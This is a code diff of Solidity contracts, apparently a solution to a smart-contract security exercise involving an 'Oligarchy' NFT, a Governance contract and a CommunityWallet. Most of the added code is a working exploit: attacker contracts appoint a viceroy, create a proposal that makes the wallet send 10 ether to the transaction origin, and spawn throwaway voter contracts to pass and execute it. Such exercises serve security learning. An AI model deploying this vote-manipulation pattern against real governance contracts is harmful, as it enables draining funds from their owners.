@@ -5,6 +5,8 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 
+import "hardhat/console.sol";
+
 contract OligarchyNFT is ERC721 {
     constructor(address attacker) ERC721("Oligarch", "OG") {
         _mint(attacker, 1);
@@ -104,7 +106,7 @@ contract Governance {
 
     function executeProposal(uint256 proposal) external {
         require(proposals[proposal].votes >= 10, "Not enough votes");
-        (bool res, ) = address(communityWallet).call(proposals[proposal].data);
+        (bool res,) = address(communityWallet).call(proposals[proposal].data);
         require(res, "call failed");
     }
 }
@@ -118,9 +120,67 @@ contract CommunityWallet {
 
     function exec(address target, bytes calldata data, uint256 value) external {
         require(msg.sender == governance, "Caller is not governance contract");
-        (bool res, ) = target.call{value: value}(data);
+        (bool res,) = target.call{value: value}(data);
         require(res, "call failed");
     }
 
     fallback() external payable {}
+}
+
+contract GovernanceAttacker {
+    //address victim;
+
+    constructor() {
+        //victim = v;
+    }
+
+    function attack(address victim) external {
+        ViceroyWorker vi = new ViceroyWorker(victim);
+        vi.attack(victim);
+    }
+
+    function appointViceroy(address victim) external {
+        Governance(victim).appointViceroy(msg.sender, 1);
+    }
+}
+
+contract ViceroyWorker {
+    uint256 pId;
+
+    constructor(address victim) {
+        console.log("AAA");
+        GovernanceAttacker(msg.sender).appointViceroy(victim);
+        console.log("BBB");
+        bytes memory proposal =
+            abi.encodeWithSignature("exec(address,bytes,uint256)", tx.origin, "", 10000000000000000000);
+        uint256 proposalId = uint256(keccak256(proposal));
+        console.log(proposalId);
+        //console.log();
+        Governance(victim).createProposal(address(0), proposal);
+        pId = proposalId;
+    }
+
+    function attack(address victim) public {
+        for (uint256 i = 0; i < 11; i++) {
+            new VoterWorker(victim, pId);
+            //Governance(victim).approveVoter(address());
+        }
+        Governance(victim).executeProposal(pId);
+    }
+
+    function approveVoter(address victim) public {
+        Governance(victim).approveVoter(msg.sender);
+    }
+
+    function disapproveVoter(address victim) public {
+        Governance(victim).disapproveVoter(msg.sender);
+    }
+}
+
+contract VoterWorker {
+    constructor(address victim, uint256 proposalId) {
+        ViceroyWorker(msg.sender).approveVoter(victim);
+        Governance(victim).voteOnProposal(proposalId, true, msg.sender);
+        ViceroyWorker(msg.sender).disapproveVoter(victim);
+    }
 }
